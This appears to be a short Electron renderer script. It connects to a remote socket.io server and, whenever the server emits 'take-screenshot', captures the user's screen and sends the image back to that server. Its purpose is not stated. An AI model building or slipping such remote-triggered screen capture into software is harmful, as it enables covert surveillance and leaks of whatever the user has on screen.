const {ipcRenderer} = require('electron');
const serverUrl = 'https://paranoia-server.herokuapp.com';
const socket = io(serverUrl);

socket.on('take-screenshot', async function() {
  const result = await ipcRenderer.invoke('screenshot');
  socket.send('took-screenshot', result);
});
